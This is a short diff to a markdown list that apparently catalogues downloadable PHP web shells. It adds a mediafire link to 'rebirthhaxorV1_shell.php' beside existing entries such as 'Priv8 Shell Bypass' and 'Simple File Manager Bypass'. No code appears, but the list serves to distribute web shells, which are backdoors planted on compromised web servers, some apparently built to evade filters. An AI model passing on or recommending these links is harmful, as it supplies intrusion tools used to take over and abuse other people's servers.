@@ -88,6 +88,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/ol95m5804ecudjx/devil-bypass_shell.php/file">Priv8 Shell Bypass</a>
 <img src="https://imgur.com/fJnl6o9.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/uxwiquifhjf4tel/rebirthhaxorV1_shell.php/file">.:R E B I R T H:.</a>
+<img src="https://imgur.com/uo6Mgvl.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/ma0fjtnvp7jpchd/sfm-bypass_shell.php/file">Simple File Manager Bypass</a>
 <img src="https://imgur.com/uiB4HT6.png" alt="beruangsalju profile">
 
